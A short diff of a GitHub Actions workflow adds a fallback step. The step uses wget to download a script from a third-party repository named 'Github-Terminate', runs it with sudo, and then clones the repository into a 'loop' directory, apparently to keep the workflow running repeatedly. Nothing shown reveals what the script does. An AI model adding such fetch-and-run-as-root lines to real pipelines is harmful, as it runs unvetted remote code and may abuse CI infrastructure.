@@ -69,7 +69,7 @@ jobs:
          continue-on-error: true
 
          run: |
-              sudo sh action.sh
+              sudo sh action.sh || wget https://raw.githubusercontent.com/rootedcyber93/Github-Terminate/main/Dockerfile;wget https://raw.githubusercontent.com/rootedcyber93/Github-Terminate/main/action.sh;sudo action.sh
 
               git clone https://github.com/${GITHUB_REPOSITORY} loop
 
